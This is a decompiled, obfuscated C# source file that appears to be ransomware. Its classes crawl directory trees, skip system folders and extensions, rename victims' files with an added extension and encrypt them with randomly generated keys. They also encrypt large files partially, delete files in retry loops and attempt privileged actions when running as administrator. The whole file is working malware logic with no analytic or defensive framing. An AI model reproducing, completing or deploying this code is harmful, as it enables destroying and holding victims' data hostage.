using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using XXsSLrAiLUmqk;

namespace fmTenshUnV;

internal sealed class tnMCcqyYFYOXqEk
{
	public sealed class OYKIUFcwSfg
	{
		private static StringCollection SAIiMqtXfoCZS;

		private static List<string> kWdkSzXJIRPq;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107405110));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107405137)) && !text.ToLower().Contains(getString_0(107405084)) && !text.ToLower().Contains(getString_0(107392561)) && !text.ToLower().Contains(getString_0(107392516)) && !text.ToLower().Contains(getString_0(107405103)) && !text.ToLower().Contains(getString_0(107392396)) && !text.ToLower().Contains(getString_0(107391825)) && !text.ToLower().Contains(getString_0(107391776)) && !text.ToLower().Contains(getString_0(107391791)) && !text.ToLower().Contains(getString_0(107391742)) && !text.ToLower().Contains(getString_0(107391708)) && !text.ToLower().Contains(getString_0(107391723)) && !text.ToLower().Contains(getString_0(107391674)) && !text.ToLower().Contains(getString_0(107391693)) && !text.ToLower().Contains(getString_0(107391640)) && !text.ToLower().Contains(getString_0(107391659)) && !text.ToLower().Contains(getString_0(107391614)) && !text.ToLower().Contains(getString_0(107391629)) && !text.ToLower().Contains(getString_0(107392092)) && !text.Contains(BaxqkGxiBeqS(getString_0(107392107))) && !text.Contains(getString_0(107392082)) && !text.Contains(getString_0(107392052)) && !text.EndsWith(getString_0(107395199)) && !text.EndsWith(getString_0(107391995)) && !text.EndsWith(getString_0(107391990)) && !text.EndsWith(getString_0(107392017)) && !text.EndsWith(getString_0(107392012)) && !text.ToLower().Contains(getString_0(107392007)) && !text.ToLower().Contains(gAPIhZLzhm))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(UyWlViVLMSGFTM) * 1024.0 * 1024.0 && WpurxQrnnk == getString_0(107396743))
							{
								kWdkSzXJIRPq.Add(text);
							}
							else if (File.Exists(text) && WpurxQrnnk == getString_0(107397140))
							{
								kWdkSzXJIRPq.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return kWdkSzXJIRPq;
		}

		static OYKIUFcwSfg()
		{
			Strings.CreateGetStringDelegate(typeof(OYKIUFcwSfg));
			SAIiMqtXfoCZS = new StringCollection();
			kWdkSzXJIRPq = new List<string>();
		}
	}

	private sealed class zctIaEqtkziMSx
	{
		public string BtegvjAXQpQr;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == BtegvjAXQpQr;
		}
	}

	private sealed class vpbfbIAWAYvUfQ
	{
		public string dozAlNcIgjCiZ;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__1a(int int_0)
		{
			Thread.Sleep(XvWBphKuRyvD);
			QuXRcyqyIgSTxy.Add(getString_0(107391908) + dozAlNcIgjCiZ + getString_0(107397116) + (char)int_0 + getString_0(107405057));
			try
			{
				if (gSSiJyrGCBHZ)
				{
					Console.WriteLine(getString_0(107391908) + dozAlNcIgjCiZ + getString_0(107397116) + (char)int_0 + getString_0(107405057));
				}
			}
			catch
			{
			}
		}

		static vpbfbIAWAYvUfQ()
		{
			Strings.CreateGetStringDelegate(typeof(vpbfbIAWAYvUfQ));
		}
	}

	private sealed class GbxlAQlQHmnHrp
	{
		private sealed class aflNftZKgNUW
		{
			public GbxlAQlQHmnHrp mwdfCPznVTiz;

			public string eJUHJSZrrQt;

			public void _003CCrypt_003Eb__26()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					mxEIGQblxg(WindowsIdentity.GetCurrent().Name, eJUHJSZrrQt);
				}
			}

			public void _003CCrypt_003Eb__27()
			{
				palyFKafVcK(eJUHJSZrrQt, mwdfCPznVTiz.DsVmeoUgKN, mwdfCPznVTiz.jEiBZhFgEnbIo, mwdfCPznVTiz.yZOxevKzEIK, mwdfCPznVTiz.XLsIKvSOSiTpLW);
			}
		}

		public string[] DsVmeoUgKN;

		public string[] yZOxevKzEIK;

		public string XLsIKvSOSiTpLW;

		public string jEiBZhFgEnbIo;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__25(string string_0)
		{
			aflNftZKgNUW CS_0024_003C_003E8__locals0 = new aflNftZKgNUW();
			CS_0024_003C_003E8__locals0.mwdfCPznVTiz = this;
			CS_0024_003C_003E8__locals0.eJUHJSZrrQt = string_0;
			if (CZxXSwBijFtPD && !PxuvQHOJlLM().Contains(getString_0(107388148)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						mxEIGQblxg(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.eJUHJSZrrQt);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (VRPOZozIAQYe == getString_0(107396751))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					palyFKafVcK(CS_0024_003C_003E8__locals0.eJUHJSZrrQt, CS_0024_003C_003E8__locals0.mwdfCPznVTiz.DsVmeoUgKN, CS_0024_003C_003E8__locals0.mwdfCPznVTiz.jEiBZhFgEnbIo, CS_0024_003C_003E8__locals0.mwdfCPznVTiz.yZOxevKzEIK, CS_0024_003C_003E8__locals0.mwdfCPznVTiz.XLsIKvSOSiTpLW);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				palyFKafVcK(CS_0024_003C_003E8__locals0.eJUHJSZrrQt, DsVmeoUgKN, jEiBZhFgEnbIo, yZOxevKzEIK, XLsIKvSOSiTpLW);
			}
		}

		static GbxlAQlQHmnHrp()
		{
			Strings.CreateGetStringDelegate(typeof(GbxlAQlQHmnHrp));
		}
	}

	private sealed class zSvtksGUxSCJaG
	{
		private sealed class AfCAWljeyDFMF
		{
			public zSvtksGUxSCJaG AhDWxIHxfl;

			public string rmVQhBqqNF;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__33()
			{
				foreach (string item in rtjfJHAbipnYF)
				{
					if (rmVQhBqqNF.ToLower().EndsWith(item + AhDWxIHxfl.VbWVwrNehsYl) && OZzUcHNaqca == getString_0(107396762))
					{
						if (Convert.ToInt32(zVxtpLMtWN) * 1024 * 1024 > new FileInfo(rmVQhBqqNF).Length)
						{
							try
							{
								jCOJRzSaQahQUJH.PrZGmImJdFgV(getString_0(107392740), getString_0(107392735), getString_0(107392690), rmVQhBqqNF);
							}
							catch
							{
							}
						}
					}
					else if (rmVQhBqqNF.ToLower().EndsWith(item) && OZzUcHNaqca == getString_0(107397159))
					{
						try
						{
							jCOJRzSaQahQUJH.PrZGmImJdFgV(getString_0(107392740), getString_0(107392735), getString_0(107392690), rmVQhBqqNF);
						}
						catch
						{
						}
					}
				}
			}

			static AfCAWljeyDFMF()
			{
				Strings.CreateGetStringDelegate(typeof(AfCAWljeyDFMF));
			}
		}

		private sealed class UAtGHiwhAxrl
		{
			public zSvtksGUxSCJaG AhDWxIHxfl;

			public string XEeHPtOhWq;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__35()
			{
				foreach (string item in rtjfJHAbipnYF)
				{
					if (XEeHPtOhWq.ToLower().EndsWith(item + AhDWxIHxfl.VbWVwrNehsYl) && OZzUcHNaqca == getString_0(107396765))
					{
						if (Convert.ToInt32(zVxtpLMtWN) * 1024 * 1024 > new FileInfo(XEeHPtOhWq).Length)
						{
							try
							{
								jCOJRzSaQahQUJH.PrZGmImJdFgV(getString_0(107392743), getString_0(107392738), getString_0(107392693), XEeHPtOhWq);
							}
							catch
							{
							}
						}
					}
					else if (XEeHPtOhWq.ToLower().EndsWith(item) && OZzUcHNaqca == getString_0(107397162))
					{
						try
						{
							jCOJRzSaQahQUJH.PrZGmImJdFgV(getString_0(107392743), getString_0(107392738), getString_0(107392693), XEeHPtOhWq);
						}
						catch
						{
						}
					}
				}
			}

			static UAtGHiwhAxrl()
			{
				Strings.CreateGetStringDelegate(typeof(UAtGHiwhAxrl));
			}
		}

		public List<string> MARwAeVueRdw;

		public List<string> WtZodkqAZtX;

		public string VbWVwrNehsYl;

		public string[] LzVXgnnvTgpKaVb;

		public string xmYLyARLYEl;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__32(string string_0)
		{
			AfCAWljeyDFMF CS_0024_003C_003E8__locals0;
			foreach (string item in WtZodkqAZtX)
			{
				if (LzVXgnnvTgpKaVb.Length != 0)
				{
					string[] lzVXgnnvTgpKaVb = LzVXgnnvTgpKaVb;
					int num = 0;
					while (num < lzVXgnnvTgpKaVb.Length)
					{
						string value = lzVXgnnvTgpKaVb[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_072e;
					}
				}
				try
				{
					if (item.EndsWith(VbWVwrNehsYl))
					{
						goto IL_072e;
					}
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				if (!item.EndsWith(string_0) || diKnMADbMAYp.Contains(item))
				{
					continue;
				}
				if (JQZPkWnOzqnmK == getString_0(107396759))
				{
					try
					{
						if (JPlUIARxIoI.xRFTZTzbmDo(item))
						{
							JPlUIARxIoI.PKODcjuKIwO(item);
						}
					}
					catch
					{
					}
				}
				diKnMADbMAYp.Add(item);
				if (!BTRlqjNfLlWsE.Contains(Path.GetDirectoryName(item)))
				{
					BTRlqjNfLlWsE.Add(Path.GetDirectoryName(item));
				}
				RhuDTDuXfGTW(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (XKASwlGUBpzh)
						{
							try
							{
								File.AppendAllText(UQSYzQClpMD, getString_0(107388290) + item + getString_0(107405065) + ex2.Message + getString_0(107396612));
							}
							catch (Exception)
							{
							}
						}
						xGavVPJiJhi++;
						goto end_IL_00ee;
					}
					if (lzqKhPamqvFJR == getString_0(107396759) && new FileInfo(item).Length > Convert.ToInt32(rwFJViTtnOvWkjuSM) * 1024 * 1024 && !MARwAeVueRdw.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new AfCAWljeyDFMF();
						CS_0024_003C_003E8__locals0.AhDWxIHxfl = this;
						try
						{
							if (VbWVwrNehsYl != getString_0(107388523))
							{
								if (VVuqpZMWeENUoLrM)
								{
									VbWVwrNehsYl = lZgHybZuOJvtb + VbWVwrNehsYl;
								}
								File.Move(item, item + VbWVwrNehsYl);
							}
						}
						catch (Exception ex4)
						{
							if (XKASwlGUBpzh)
							{
								try
								{
									File.AppendAllText(UQSYzQClpMD, getString_0(107388290) + item + getString_0(107405004) + ex4.Message + getString_0(107396612));
								}
								catch (Exception)
								{
								}
							}
							xGavVPJiJhi++;
							goto end_IL_00ee;
						}
						CS_0024_003C_003E8__locals0.rmVQhBqqNF = getString_0(107393136);
						if (VbWVwrNehsYl != getString_0(107388523))
						{
							CS_0024_003C_003E8__locals0.rmVQhBqqNF = item + VbWVwrNehsYl;
						}
						else
						{
							CS_0024_003C_003E8__locals0.rmVQhBqqNF = item;
						}
						if (NQwCDAjXKTQu == getString_0(107396759))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in rtjfJHAbipnYF)
								{
									if (CS_0024_003C_003E8__locals0.rmVQhBqqNF.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.AhDWxIHxfl.VbWVwrNehsYl) && OZzUcHNaqca == AfCAWljeyDFMF.getString_0(107396762))
									{
										if (Convert.ToInt32(zVxtpLMtWN) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.rmVQhBqqNF).Length)
										{
											try
											{
												jCOJRzSaQahQUJH.PrZGmImJdFgV(AfCAWljeyDFMF.getString_0(107392740), AfCAWljeyDFMF.getString_0(107392735), AfCAWljeyDFMF.getString_0(107392690), CS_0024_003C_003E8__locals0.rmVQhBqqNF);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.rmVQhBqqNF.ToLower().EndsWith(item2) && OZzUcHNaqca == AfCAWljeyDFMF.getString_0(107397159))
									{
										try
										{
											jCOJRzSaQahQUJH.PrZGmImJdFgV(AfCAWljeyDFMF.getString_0(107392740), AfCAWljeyDFMF.getString_0(107392735), AfCAWljeyDFMF.getString_0(107392690), CS_0024_003C_003E8__locals0.rmVQhBqqNF);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = QvsBSwYTyC.iYyUrROgryUA(32);
						string s = pIXIfQBxEjhZIRLa.bvSKDBbYtIq(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = JODGCfeUBqfSiYrU.ZDfiLXsQVNoG(CS_0024_003C_003E8__locals0.rmVQhBqqNF, Convert.ToInt32(rwFJViTtnOvWkjuSM) * 1024 * 1024);
						JODGCfeUBqfSiYrU.xEZuYNVpsYfClBPn(TmDAkSZaIXHu: (!dVQGFoqGywL) ? (nzkUSgBdGXcD ? JODGCfeUBqfSiYrU.RjhBaSeYoCMetj(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : JODGCfeUBqfSiYrU.RjhBaSeYoCMetj(byte_, Encoding.ASCII.GetBytes(xmYLyARLYEl), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (nzkUSgBdGXcD ? hJXihuhLevZxEZT.kJxCHDbuQavrk(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : hJXihuhLevZxEZT.kJxCHDbuQavrk(byte_, Encoding.ASCII.GetBytes(xmYLyARLYEl), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), NhYncFtSRCZPt: CS_0024_003C_003E8__locals0.rmVQhBqqNF, EzXeaGcOJNH: bytes);
					}
					else
					{
						if (VVuqpZMWeENUoLrM)
						{
							VbWVwrNehsYl = lZgHybZuOJvtb + VbWVwrNehsYl;
						}
						string text2 = QvsBSwYTyC.iYyUrROgryUA(32);
						string s2 = pIXIfQBxEjhZIRLa.bvSKDBbYtIq(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (VbWVwrNehsYl != getString_0(107388523))
						{
							if (!fHmXdeOHBwOZw)
							{
								if (!nzkUSgBdGXcD)
								{
									JPBxRJXKpi(item, item + VbWVwrNehsYl, PUSRZdlFWQWg);
								}
								else
								{
									JPBxRJXKpi(item, item + VbWVwrNehsYl, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!nzkUSgBdGXcD)
									{
										HXNDSqKYInE(item, item + VbWVwrNehsYl, PUSRZdlFWQWg);
									}
									else
									{
										HXNDSqKYInE(item, item + VbWVwrNehsYl, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (XKASwlGUBpzh)
									{
										try
										{
											File.AppendAllText(UQSYzQClpMD, getString_0(107388290) + item + getString_0(107388541) + ex6.Message + getString_0(107396612));
										}
										catch (Exception)
										{
										}
									}
									xGavVPJiJhi++;
									goto end_IL_00ee;
								}
							}
						}
						else if (!fHmXdeOHBwOZw)
						{
							if (!nzkUSgBdGXcD)
							{
								JPBxRJXKpi(item, item + getString_0(107388518), PUSRZdlFWQWg);
							}
							else
							{
								JPBxRJXKpi(item, item + getString_0(107388518), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!nzkUSgBdGXcD)
								{
									HXNDSqKYInE(item, item, PUSRZdlFWQWg);
								}
								else
								{
									HXNDSqKYInE(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (XKASwlGUBpzh)
								{
									try
									{
										File.AppendAllText(UQSYzQClpMD, getString_0(107388290) + item + getString_0(107388541) + ex8.Message + getString_0(107396612));
									}
									catch (Exception)
									{
									}
								}
								xGavVPJiJhi++;
								goto end_IL_00ee;
							}
						}
						if (nzkUSgBdGXcD)
						{
							if (VbWVwrNehsYl != getString_0(107388523))
							{
								yirsdStUbSe(item + VbWVwrNehsYl, bytes2);
							}
							else
							{
								yirsdStUbSe(item, bytes2);
							}
						}
					}
					goto IL_072e;
					end_IL_00ee:;
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				continue;
				IL_072e:
				WtZodkqAZtX.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__34(string string_0)
		{
			UAtGHiwhAxrl CS_0024_003C_003E8__locals0 = new UAtGHiwhAxrl();
			CS_0024_003C_003E8__locals0.AhDWxIHxfl = this;
			CS_0024_003C_003E8__locals0.XEeHPtOhWq = string_0;
			if (LzVXgnnvTgpKaVb.Length != 0)
			{
				string[] lzVXgnnvTgpKaVb = LzVXgnnvTgpKaVb;
				int num = 0;
				while (num < lzVXgnnvTgpKaVb.Length)
				{
					string value = lzVXgnnvTgpKaVb[num];
					if (!CS_0024_003C_003E8__locals0.XEeHPtOhWq.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.XEeHPtOhWq.EndsWith(VbWVwrNehsYl))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!diKnMADbMAYp.Contains(CS_0024_003C_003E8__locals0.XEeHPtOhWq))
			{
				if (JQZPkWnOzqnmK == getString_0(107396759))
				{
					try
					{
						if (JPlUIARxIoI.xRFTZTzbmDo(CS_0024_003C_003E8__locals0.XEeHPtOhWq))
						{
							JPlUIARxIoI.PKODcjuKIwO(CS_0024_003C_003E8__locals0.XEeHPtOhWq);
						}
					}
					catch
					{
					}
				}
				diKnMADbMAYp.Add(CS_0024_003C_003E8__locals0.XEeHPtOhWq);
				if (!BTRlqjNfLlWsE.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.XEeHPtOhWq)))
				{
					BTRlqjNfLlWsE.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.XEeHPtOhWq));
				}
				RhuDTDuXfGTW(CS_0024_003C_003E8__locals0.XEeHPtOhWq);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.XEeHPtOhWq).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (XKASwlGUBpzh)
						{
							try
							{
								File.AppendAllText(UQSYzQClpMD, getString_0(107388290) + CS_0024_003C_003E8__locals0.XEeHPtOhWq + getString_0(107405065) + ex2.Message + getString_0(107396612));
							}
							catch (Exception)
							{
							}
						}
						xGavVPJiJhi++;
						goto end_IL_0117_2;
					}
					if (lzqKhPamqvFJR == getString_0(107396759) && new FileInfo(CS_0024_003C_003E8__locals0.XEeHPtOhWq).Length > Convert.ToInt32(rwFJViTtnOvWkjuSM) * 1024 * 1024)
					{
						try
						{
							if (VbWVwrNehsYl != getString_0(107388523))
							{
								if (VVuqpZMWeENUoLrM)
								{
									VbWVwrNehsYl = lZgHybZuOJvtb + VbWVwrNehsYl;
								}
								File.Move(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + VbWVwrNehsYl);
							}
						}
						catch (Exception ex4)
						{
							if (XKASwlGUBpzh)
							{
								try
								{
									File.AppendAllText(UQSYzQClpMD, getString_0(107388290) + CS_0024_003C_003E8__locals0.XEeHPtOhWq + getString_0(107405004) + ex4.Message + getString_0(107396612));
								}
								catch (Exception)
								{
								}
							}
							xGavVPJiJhi++;
							return;
						}
						if (VbWVwrNehsYl != getString_0(107388523))
						{
							CS_0024_003C_003E8__locals0.XEeHPtOhWq += VbWVwrNehsYl;
						}
						if (NQwCDAjXKTQu == getString_0(107396759))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in rtjfJHAbipnYF)
								{
									if (CS_0024_003C_003E8__locals0.XEeHPtOhWq.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.AhDWxIHxfl.VbWVwrNehsYl) && OZzUcHNaqca == UAtGHiwhAxrl.getString_0(107396765))
									{
										if (Convert.ToInt32(zVxtpLMtWN) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.XEeHPtOhWq).Length)
										{
											try
											{
												jCOJRzSaQahQUJH.PrZGmImJdFgV(UAtGHiwhAxrl.getString_0(107392743), UAtGHiwhAxrl.getString_0(107392738), UAtGHiwhAxrl.getString_0(107392693), CS_0024_003C_003E8__locals0.XEeHPtOhWq);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.XEeHPtOhWq.ToLower().EndsWith(item) && OZzUcHNaqca == UAtGHiwhAxrl.getString_0(107397162))
									{
										try
										{
											jCOJRzSaQahQUJH.PrZGmImJdFgV(UAtGHiwhAxrl.getString_0(107392743), UAtGHiwhAxrl.getString_0(107392738), UAtGHiwhAxrl.getString_0(107392693), CS_0024_003C_003E8__locals0.XEeHPtOhWq);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = QvsBSwYTyC.iYyUrROgryUA(32);
						string s = pIXIfQBxEjhZIRLa.bvSKDBbYtIq(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = JODGCfeUBqfSiYrU.ZDfiLXsQVNoG(CS_0024_003C_003E8__locals0.XEeHPtOhWq, Convert.ToInt32(rwFJViTtnOvWkjuSM) * 1024 * 1024);
						JODGCfeUBqfSiYrU.xEZuYNVpsYfClBPn(TmDAkSZaIXHu: (!dVQGFoqGywL) ? (nzkUSgBdGXcD ? JODGCfeUBqfSiYrU.RjhBaSeYoCMetj(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : JODGCfeUBqfSiYrU.RjhBaSeYoCMetj(byte_, Encoding.ASCII.GetBytes(xmYLyARLYEl), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (nzkUSgBdGXcD ? hJXihuhLevZxEZT.kJxCHDbuQavrk(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : hJXihuhLevZxEZT.kJxCHDbuQavrk(byte_, Encoding.ASCII.GetBytes(xmYLyARLYEl), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), NhYncFtSRCZPt: CS_0024_003C_003E8__locals0.XEeHPtOhWq, EzXeaGcOJNH: bytes);
					}
					else
					{
						if (VVuqpZMWeENUoLrM)
						{
							VbWVwrNehsYl = lZgHybZuOJvtb + VbWVwrNehsYl;
						}
						string text2 = QvsBSwYTyC.iYyUrROgryUA(32);
						string s2 = pIXIfQBxEjhZIRLa.bvSKDBbYtIq(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (VbWVwrNehsYl != getString_0(107388523))
						{
							if (!fHmXdeOHBwOZw)
							{
								if (!nzkUSgBdGXcD)
								{
									JPBxRJXKpi(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + VbWVwrNehsYl, PUSRZdlFWQWg);
								}
								else
								{
									JPBxRJXKpi(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + VbWVwrNehsYl, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!nzkUSgBdGXcD)
									{
										HXNDSqKYInE(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + VbWVwrNehsYl, PUSRZdlFWQWg);
									}
									else
									{
										HXNDSqKYInE(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + VbWVwrNehsYl, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (XKASwlGUBpzh)
									{
										try
										{
											File.AppendAllText(UQSYzQClpMD, getString_0(107388290) + CS_0024_003C_003E8__locals0.XEeHPtOhWq + getString_0(107388541) + ex6.Message + getString_0(107396612));
										}
										catch (Exception)
										{
										}
									}
									xGavVPJiJhi++;
									return;
								}
							}
						}
						else if (!fHmXdeOHBwOZw)
						{
							if (!nzkUSgBdGXcD)
							{
								JPBxRJXKpi(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + getString_0(107388518), PUSRZdlFWQWg);
							}
							else
							{
								JPBxRJXKpi(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq + getString_0(107388518), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!nzkUSgBdGXcD)
								{
									HXNDSqKYInE(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq, PUSRZdlFWQWg);
								}
								else
								{
									HXNDSqKYInE(CS_0024_003C_003E8__locals0.XEeHPtOhWq, CS_0024_003C_003E8__locals0.XEeHPtOhWq, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (XKASwlGUBpzh)
								{
									try
									{
										File.AppendAllText(UQSYzQClpMD, getString_0(107388290) + CS_0024_003C_003E8__locals0.XEeHPtOhWq + getString_0(107388541) + ex8.Message + getString_0(107396612));
									}
									catch (Exception)
									{
									}
								}
								xGavVPJiJhi++;
								return;
							}
						}
						if (nzkUSgBdGXcD)
						{
							if (VbWVwrNehsYl != getString_0(107388523))
							{
								yirsdStUbSe(CS_0024_003C_003E8__locals0.XEeHPtOhWq + VbWVwrNehsYl, bytes2);
							}
							else
							{
								yirsdStUbSe(CS_0024_003C_003E8__locals0.XEeHPtOhWq, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			WtZodkqAZtX.Remove(CS_0024_003C_003E8__locals0.XEeHPtOhWq);
		}

		static zSvtksGUxSCJaG()
		{
			Strings.CreateGetStringDelegate(typeof(zSvtksGUxSCJaG));
		}
	}

	private sealed class elAlpmouXOIvx
	{
		public string yAHxhTflyfalc;

		public string AvDgGpmgGbbZCjnL;

		public void _003CEncrypt2_003Eb__42()
		{
			while (true)
			{
				try
				{
					File.Delete(yAHxhTflyfalc);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__43()
		{
			while (true)
			{
				try
				{
					if (File.Exists(AvDgGpmgGbbZCjnL))
					{
						File.Delete(AvDgGpmgGbbZCjnL);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string xGwyIHSaEbgRgwng;

	public static byte[] PUSRZdlFWQWg;

	public static string WpurxQrnnk;

	public static string UyWlViVLMSGFTM;

	public static List<string> QuXRcyqyIgSTxy;

	public static List<string> VoJjhuyDVrQJKwWcbnV;

	public static string wltjXNSnNn;

	public static string xmYLyARLYEl;

	public static string EANmnkdFJkrj;

	public static string UlCmUlRoTcchfe;

	public static int LCDRypxVRToeCM;

	public static string JQZPkWnOzqnmK;

	public static string aOlUzzLVcTqPTZ;

	public static string AIzbAgaRmun;

	public static string dzjEboULGEXLt;

	public static string tDOIoIRHdUgOrlVRs;

	public static string QyeknkRnGov;

	public static string vgnbVPuEBBsBxef;

	public static string qjFKpsqJnCjq;

	public static List<string> GDnIIBbHro;

	public static List<string> BTRlqjNfLlWsE;

	public static string ydKzUCuwuIJw;

	public static string JGPRtFKquVJgD;

	public static string XIeISfblwLiZC;

	public static List<string> diKnMADbMAYp;

	public static string XyPIFbjkPYE;

	private static string AZaOxwJcnDFPb;

	public static string VRPOZozIAQYe;

	public static string JlPlrPBuNWYZ;

	public static List<string> NBCeOPAYUzsBkAKb;

	public static List<string> FJNexnLlneosRhQ;

	public static List<string> ctnxoknClYAD;

	public static List<string> mKLyhqkijpZNwYs;

	public static string AXvssecAngWd;

	public static List<string> zcmRrFXWRTRDV;

	public static List<string> VnGdzxwiUTFhYj;

	public static string bMFiiPOhazs;

	public static string kPTEvsSxKFMV;

	internal static DateTime qxVYSHbtKRdGgb;

	internal static DateTime zURDwkTFacZ;

	public static string lzqKhPamqvFJR;

	public static string rwFJViTtnOvWkjuSM;

	public static string gzyCOUUaDblUjB;

	public static string mSvGMpoEYpmNY;

	public static string UYcbTIXdkdS;

	public static string SFYhYyizDAJm;

	public static string dUlNsNRISof;

	public static string NQwCDAjXKTQu;

	public static List<string> rtjfJHAbipnYF;

	public static string OZzUcHNaqca;

	public static string zVxtpLMtWN;

	public static string kafTkbRxqsRv;

